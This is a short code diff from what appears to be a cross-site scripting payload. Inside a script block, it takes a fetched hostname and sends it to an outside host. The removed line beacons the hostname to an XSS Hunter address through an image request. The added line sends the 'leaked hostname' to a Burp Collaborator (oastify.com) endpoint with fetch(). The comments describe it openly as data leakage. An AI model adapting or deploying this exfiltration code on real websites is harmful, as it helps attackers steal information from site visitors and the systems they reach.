@@ -9,8 +9,8 @@
     })
     .then(r => r.text())
     .then(hostname => {
-      // Send raw hostname in the path so it shows up in XSS Hunter report URL
-      new Image().src = "https://js.rip/5mw8at9w5s/" + encodeURIComponent(hostname);
+      // Send leaked hostname via HTTP GET to your Collaborator server
+      fetch("https://av9f75zghc4snr5c00nn5vworfx6lxnlc.oastify.com/leak?hostname=" + encodeURIComponent(hostname));
     });
     // No .catch — if fetch fails, only the script load fires
   </script>
